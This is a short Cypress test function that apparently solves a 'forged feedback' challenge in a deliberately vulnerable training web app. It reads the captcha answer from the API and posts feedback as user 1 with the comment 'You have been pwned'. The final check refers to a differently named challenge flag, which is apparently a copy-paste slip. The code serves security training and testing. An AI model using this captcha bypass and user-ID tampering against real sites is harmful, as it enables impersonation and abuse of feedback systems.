export function forgedFeedbackChallenge() {
    
  const captchaRequestOption = {
    method: 'GET',
    url: '/rest/captcha/',
  };
    
  cy.request(captchaRequestOption).then( (resp) => {

    const FeedbackRequestOptions = {
      method: 'POST',
      url: '/api/Feedbacks/',
      body: {
        UserId: 1,
        captchaId: resp.body.captchaId,
        captcha: resp.body.answer,
        comment: "You have been pwned",
        rating: 1
      }
    };

    cy.request(FeedbackRequestOptions).then( () => {
             cy.isSolvedChallenge('basketAccessChallenge').should('eq', true);
    });
           
  });

}
